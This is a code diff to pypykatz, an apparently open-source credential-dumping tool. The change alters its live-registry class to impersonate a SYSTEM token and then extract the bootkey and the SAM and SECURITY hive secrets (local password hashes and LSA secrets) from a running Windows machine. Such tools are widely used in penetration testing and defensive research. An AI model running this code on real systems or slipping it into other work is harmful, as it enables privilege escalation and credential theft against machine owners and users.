@@ -9,13 +9,11 @@ from pypykatz.registry.sam.sam import *
 from pypykatz.registry.security.security import *
 from pypykatz.registry.system.system import *
 
-from pypykatz.commons.readers.local.common.privileges import RtlAdjustPrivilege
-from pypykatz.commons.readers.local.common.privileges_types import PrivilegeValues
-from pypykatz.commons.elevate import getsystem_token
+from pypykatz.commons.winapi.processmanipulator import ProcessManipulator
 
 
 class LiveRegistry:
-	def __init__(self):		
+	def __init__(self):
 		self.sam_hive = None
 		self.security_hive = None
 		self.system_hive = None
@@ -25,27 +23,31 @@ class LiveRegistry:
 		self.security = None
 		
 	def get_secrets(self):
-		#getsystem_token()
+		"""
+		For obtaining all secrets from the registry on-the-fly, SYSTEM user MUST be used!
+		In case this is not achievable, Administrator can be used to first dump the registry hives to disk, then parse them offline
+		"""
+		pm = ProcessManipulator()
 		try:
-			RtlAdjustPrivilege(PrivilegeValues.SE_BACKUP.value)
-			RtlAdjustPrivilege(PrivilegeValues.SE_TAKE_OWNERSHIP.value)
+			#getting a SYSTEM token...
+			pm.assign_token_thread_sid()
 		except Exception as e:
-			logger.error('Failed to obtain SE_BACKUP privilege! Registry dump will not work! Reason: %s' % str(e))
+			logging.error('Failed to obtain SYSTEM prvis. On-the-fly parsing is not possible.')
 			raise e
-		
-		self.system = SYSTEM(self.system_hive)
-		bootkey = self.system.get_bootkey()
-		
-		if self.sam_hive:
-			self.sam = SAM(self.sam_hive, bootkey)
-			self.sam.get_secrets()
+		else:
+			self.system = SYSTEM(self.system_hive)
+			bootkey = self.system.get_bootkey()
 			
-		if self.security_hive:
-			self.security = SECURITY(self.security_hive, bootkey)
-			self.security.get_secrets()
+			if self.sam_hive:
+				self.sam = SAM(self.sam_hive, bootkey)
+				self.sam.get_secrets()
+				
+			if self.security_hive:
+				self.security = SECURITY(self.security_hive, bootkey)
+				self.security.get_secrets()
+				
+			self.cleanup()
 			
-		self.cleanup()
-		
 	def cleanup(self):
 		for hive in [self.system_hive, self.security_hive, self.sam_hive]:
 			try:
@@ -73,8 +75,3 @@ class LiveRegistry:
 		
 		lr.get_secrets()
 		return lr
-	
-	
-if __name__ == '__main__':
-	po = PypyKatzOffineRegistry.from_live_system()
-	print(str(po))
